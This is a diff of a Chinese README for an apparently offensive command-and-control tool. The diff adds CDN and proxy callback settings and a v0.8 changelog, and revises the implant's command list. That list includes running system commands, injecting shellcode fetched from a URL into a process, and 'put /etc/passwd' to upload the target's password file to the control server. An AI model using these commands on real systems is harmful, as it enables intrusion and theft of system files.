@@ -37,13 +37,15 @@
 
 新建项目 配置需要填写以下项：
 
-项目名称: 随便写 hvv2022
+项目名称: 随便写 如：hvv2022
 
 回调地址: 外网IP和端口  http://12.34.56.78:8080
 
 上线域名: cdn域名 如果没有上cdn则填写和回调地址一样
 
-Host    : cdn上线时所需要的host请求头 
+Host头  : cdn上线时所需要的host请求头 
+
+代理地址: NPC上线时如果需要走代理，在这里配置。比如我测试用的clash，代理配置为http://192.168.93.1:7890
 
 其它都会默认生成，点击确定更新之后需要刷新列表重新启用项目状态。
 
@@ -86,11 +88,12 @@ ls        枚举文件 eg: ls /
 cd        切换目录 eg: cd / 
 sh        执行系统命令  eg: sh ps -aux  , sh tasklist  
 cat       读取文本 cat a.txt
-screen    执行截屏 screen (可能会报毒。。待优化)
-wget      下载文件 eg: wget http://192.168.1.1/a.txt <a.txt>   文件名可选 默认当前  
-start     执行插件可执行文件 eg: start name <args>   需要可执行文件在plugins目录下 会自动把插件传到目标机器上面
-pl        执行插件 eg: pl plugname <plugargs>     需要插件在plugins目录下 
-inject    注入进程 eg: inject pid <shellcodeurl>  shellcodeurl可选 默认下载当前shellcode下载链接 
+screen    执行截屏 screen
+wget      下载文件 eg: wget http://192.168.1.1/a.txt <a.txt>    文件名可选 默认当前  
+put       上传文件 eg: put /etc/passwd                          将passwd文件上传到nps服务器  
+start     执行插件可执行文件 eg: start name <args>               需要可执行文件在plugins目录下 会自动把插件传到目标机器上面
+pl        执行插件 eg: pl plugname <plugargs>                   需要插件在plugins目录下 
+inject    注入进程 eg: inject pid <shellcodeurl>                shellcodeurl可选 默认下载当前shellcode下载链接 
 
 
 ```
@@ -200,8 +203,15 @@ message PlugResult {
  
 ## 更新
 
-### todo
+### v0.8 
+1、获取真实公网地址、并展示IP归属 , 密码加密，上线提醒功能 
 
+2、支持cdn上线，加入代理上线功能 修复host头问题
+
+3、默认获取所有历史npc上线列表
+
+4、修复其它bug
+ 
 
 ### v0.7
 1、新增shellcode加载方式，新增系统位数区分
